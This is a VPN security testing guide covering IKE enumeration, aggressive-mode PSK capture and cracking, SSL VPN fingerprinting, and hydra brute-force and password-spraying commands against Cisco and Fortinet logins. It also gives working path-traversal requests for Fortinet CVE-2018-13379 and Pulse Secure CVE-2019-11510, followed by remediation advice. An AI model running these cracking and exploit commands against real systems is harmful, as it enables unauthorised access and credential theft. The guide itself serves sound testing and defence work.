# VPN Security Testing

## Overview
VPN (Virtual Private Network) security testing evaluates the strength and configuration of VPN implementations that protect remote access and site-to-site communications. Testing covers IKE/IPsec, SSL/TLS VPNs (OpenVPN, WireGuard), and vendor-specific solutions. Weaknesses in VPN configurations can expose encrypted tunnels to interception, allow unauthorized access to internal networks, or enable credential theft. As the primary gateway for remote workforce access, VPN security is critical to organizational perimeter defense.

## Classification
- **CWE:** CWE-326 (Inadequate Encryption Strength), CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-295 (Improper Certificate Validation), CWE-287 (Improper Authentication)
- **MITRE ATT&CK:** T1133 (External Remote Services), T1573 (Encrypted Channel), T1199 (Trusted Relationship), T1110 (Brute Force)
- **CVSS Base:** 5.0 - 9.8 (Medium to Critical, depending on vulnerability)

## Detection Methodology

### 1. VPN Service Discovery
Identify VPN endpoints and their types:
```bash
# Scan for common VPN ports
nmap -sU -sT -p 500,4500,1194,1723,443,8443,10000 target

# Port descriptions:
# UDP 500  - IKE (IPsec key exchange)
# UDP 4500 - IPsec NAT-T (NAT Traversal)
# TCP/UDP 1194 - OpenVPN
# TCP 1723 - PPTP
# TCP 443  - SSL VPN (Cisco AnyConnect, Fortinet, Pulse Secure, etc.)
# TCP 8443 - Alternative SSL VPN
# TCP 10000 - Cisco VPN Concentrator

# Banner grabbing
nmap -sV -p 500,4500,1194,1723,443 target

# Detect SSL VPN web portals
curl -kI https://target
curl -kI https://target/remote/login
curl -kI https://target/+CSCOE+/logon.html    # Cisco AnyConnect
curl -kI https://target/global-protect/login.esp  # Palo Alto GlobalProtect
curl -kI https://target/dana-na/auth/url_default/welcome.cgi  # Pulse Secure/Ivanti
```

### 2. IKE Enumeration
```bash
# ike-scan (primary IKE enumeration tool)
# Discover IKE service and identify vendor
ike-scan target

# Aggressive mode (may reveal group name / PSK hash)
ike-scan target --aggressive --id=vpngroup

# Enumerate transforms
ike-scan target --trans=5,2,1,2    # 3DES, SHA1, PSK, DH Group 2
ike-scan target --trans=7/256,2,1,2  # AES-256, SHA1, PSK, DH Group 2
ike-scan target --trans=7/128,1,1,2  # AES-128, MD5, PSK, DH Group 2

# IKEv2 enumeration
ike-scan target --ikev2

# Enumerate with multiple transforms
ike-scan target -M --trans=5,2,1,2 --trans=7/256,2,1,2 --trans=7/128,2,1,2

# Vendor ID fingerprinting
ike-scan target --showbackoff

# Identify VPN vendor from Vendor ID
# Common Vendor IDs indicate Cisco, Checkpoint, Fortinet, Juniper, etc.

# Nmap IKE scripts
nmap -sU -p 500 --script=ike-version target
```

### 3. IKE Aggressive Mode PSK Capture
```bash
# In aggressive mode, the VPN sends a hash of the PSK
# This can be captured and cracked offline

# Capture PSK hash using ike-scan
ike-scan target --aggressive --id=vpngroup --pskcrack=psk_hash.txt

# Crack with psk-crack (from ike-scan package)
psk-crack -d wordlist.txt psk_hash.txt

# Crack with john
john --wordlist=wordlist.txt psk_hash.txt

# Crack with hashcat
# Mode 5300 for IKEv1, Mode 5400 for IKEv2
hashcat -m 5300 psk_hash.txt wordlist.txt

# Common group names to try:
# vpn, vpngroup, cisco, ipsec, remote, dialup, default, staff, test
ike-scan target --aggressive --id=vpn --pskcrack
ike-scan target --aggressive --id=cisco --pskcrack
```

### 4. VPN Fingerprinting
```bash
# Identify VPN vendor and version
ike-scan target --showbackoff --trans=5,2,1,2

# SSL VPN fingerprinting
# Cisco AnyConnect
curl -sk https://target/+CSCOE+/logon.html | grep -i cisco

# Fortinet FortiGate
curl -sk https://target/remote/login | grep -i fortinet

# Pulse Secure / Ivanti
curl -sk https://target/dana-na/ | grep -i pulse

# Palo Alto GlobalProtect
curl -sk https://target/global-protect/login.esp | grep -i palo

# SonicWall
curl -sk https://target/cgi-bin/welcome | grep -i sonicwall

# OpenVPN
nmap -sV -p 1194 target

# WireGuard (UDP, minimal fingerprint)
# WireGuard is designed to be stealthy, no banner
nmap -sU -p 51820 target
```

### 5. SSL/TLS VPN Testing
```bash
# SSL/TLS configuration analysis
testssl.sh https://target
sslyze --regular target:443
sslscan target:443

# Check for weak ciphers
nmap --script=ssl-enum-ciphers -p 443 target

# Check for known vulnerabilities
nmap --script=ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p 443 target

# Certificate analysis
openssl s_client -connect target:443 </dev/null 2>/dev/null | openssl x509 -text

# Check for TLS downgrade
testssl.sh --each-cipher https://target
```

### 6. VPN Credential Attacks
```bash
# Brute force IKE PSK (after aggressive mode capture)
ike-scan target --aggressive --id=GROUP --pskcrack | psk-crack -d wordlist.txt

# Brute force SSL VPN login
# Cisco AnyConnect
hydra -L users.txt -P passwords.txt target https-form-post "/+webvpn+/index.html:username=^USER^&password=^PASS^:Login failed"

# Fortinet SSL VPN
hydra -L users.txt -P passwords.txt target https-form-post "/remote/logincheck:ajax=1&username=^USER^&credential=^PASS^:ret=0"

# OpenVPN credential testing
# Requires valid .ovpn config file
openvpn --config client.ovpn --auth-user-pass creds.txt

# Password spraying against VPN portals
# Spray one password at a time across many usernames
crackmapexec smb target -u users.txt -p 'Summer2024!' --continue-on-success

# Check for MFA bypass
# Test if MFA is enforced for all authentication paths
# Test if VPN accepts pre-2FA credentials
```

### 7. VPN Tunnel Analysis
```bash
# Capture VPN tunnel traffic (if MITM position achieved)
tcpdump -i eth0 -w vpn_traffic.pcap udp port 500 or udp port 4500

# Analyze ESP (Encapsulating Security Payload) traffic
tshark -r vpn_traffic.pcap -Y "esp"

# Check for split tunneling
# If split tunnel: only VPN-destined traffic goes through tunnel
# If full tunnel: all traffic goes through tunnel
# Split tunneling can expose local traffic

# Route analysis on connected VPN client
ip route show
route print
netstat -rn

# DNS leak testing
# After connecting to VPN, check if DNS queries leak outside tunnel
dig +short whoami.akamai.net @ns1-1.akamaitech.net
nslookup myip.opendns.com resolver1.opendns.com

# WebRTC leak check (browser-based)
# Even with VPN, WebRTC can reveal real IP via STUN requests
```

### 8. Known VPN Vulnerabilities
```bash
# Check for CVEs in identified VPN products

# Fortinet FortiOS (CVE-2018-13379) - Path traversal / credential disclosure
curl -sk "https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Pulse Secure (CVE-2019-11510) - Arbitrary file read
curl -sk "https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"

# Cisco AnyConnect (various CVEs)
nmap --script=http-vuln-cve2014-2120 -p 443 target

# SonicWall (CVE-2021-20016) - SQL injection
# Palo Alto GlobalProtect (CVE-2021-3064) - Buffer overflow

# Nuclei vulnerability templates
nuclei -u https://target -t cves/ -tags vpn
nuclei -u https://target -t vulnerabilities/ -tags fortinet,cisco,pulse
```

### 9. PPTP Testing (Legacy)
```bash
# PPTP is considered broken - MS-CHAPv2 is weak

# Enumerate PPTP
nmap -sV -p 1723 target
nmap --script=pptp-version -p 1723 target

# thc-pptp-bruter
thc-pptp-bruter -u user -W wordlist.txt target

# Capture and crack MS-CHAPv2
# chapcrack can decompose captured MS-CHAPv2 to DES
chapcrack parse -i captured_mschapv2.pcap
# Submit DES to cloudcracker or crack locally
```

### 10. Configuration Weakness Assessment
```bash
# Checklist of VPN configuration weaknesses:
# - IKE aggressive mode enabled (exposes PSK hash)
# - Weak encryption algorithms (DES, 3DES, RC4)
# - Weak hash algorithms (MD5, SHA1)
# - Small DH groups (Group 1, Group 2)
# - Split tunneling enabled (reduces visibility)
# - No MFA enforced
# - Default or weak group names / PSK
# - Certificate validation disabled on clients
# - Self-signed or expired certificates
# - VPN client auto-update not enforced
# - Idle session timeout too long or not set
# - No account lockout on VPN portal
# - Logging and monitoring not configured
# - PPTP or L2TP without IPsec still enabled
```

## Tool Usage

### ike-scan
```bash
# Basic scan
ike-scan target

# Comprehensive scan with all transforms
ike-scan target -M --trans=5,2,1,2 --trans=5,1,1,2 --trans=7/256,2,1,2 --trans=7/128,2,1,2

# Aggressive mode with group enumeration
for group in vpn cisco ipsec default remote staff; do
  echo "Testing group: $group"
  ike-scan target --aggressive --id=$group
done
```

### ikeforce
```bash
# Group name enumeration
ikeforce target -e -w wordlist.txt

# Enumerate with specific transform
ikeforce target -e -w wordlist.txt -t 5 2 1 2
```

### vpn-tools (custom scripts)
```bash
# Automated VPN enumeration workflow
# 1. Discover VPN endpoints
nmap -sU -sT -p 500,4500,1194,1723,443,8443 target -oA vpn_discovery

# 2. Fingerprint VPN type
ike-scan target --showbackoff 2>/dev/null

# 3. Test aggressive mode
ike-scan target --aggressive --id=vpngroup --pskcrack=hash.txt

# 4. Test SSL VPN for known CVEs
nuclei -u https://target -t cves/ -tags vpn

# 5. Test authentication
hydra -L users.txt -P passwords.txt target https-form-post "VPN_LOGIN_PATH"
```

## Remediation
1. **Disable IKE aggressive mode** -- use only main mode to protect PSK hashes
2. **Use strong encryption** -- AES-256-GCM, SHA-256+, DH Group 14+ (2048-bit) minimum
3. **Enforce MFA** -- require multi-factor authentication for all VPN connections
4. **Certificate-based authentication** -- prefer certificates over PSK or password-only auth
5. **Patch VPN appliances** -- keep firmware and software updated, subscribe to vendor advisories
6. **Disable legacy protocols** -- remove PPTP, L2TP without IPsec, SSLv3, TLS 1.0/1.1
7. **Implement full tunnel** -- avoid split tunneling to maintain traffic visibility
8. **Account lockout policies** -- enforce lockout after failed login attempts
9. **Session management** -- set idle and absolute session timeouts
10. **Logging and monitoring** -- log all VPN connections, monitor for anomalous access patterns
11. **Network segmentation post-VPN** -- do not grant full network access after VPN connection; apply zero-trust

## Evidence Collection
When documenting VPN security findings:
- VPN endpoint IP, port, and protocol identified
- VPN vendor and version fingerprinted
- IKE transforms and encryption parameters negotiated
- Aggressive mode PSK hash captured (provide hash, not cracked password in report)
- SSL/TLS cipher suite analysis results
- Known CVEs applicable to identified VPN version
- Authentication weaknesses found (no MFA, weak passwords, default credentials)
- Split tunneling configuration status
- Certificate chain and validity assessment
- Network access scope after VPN connection
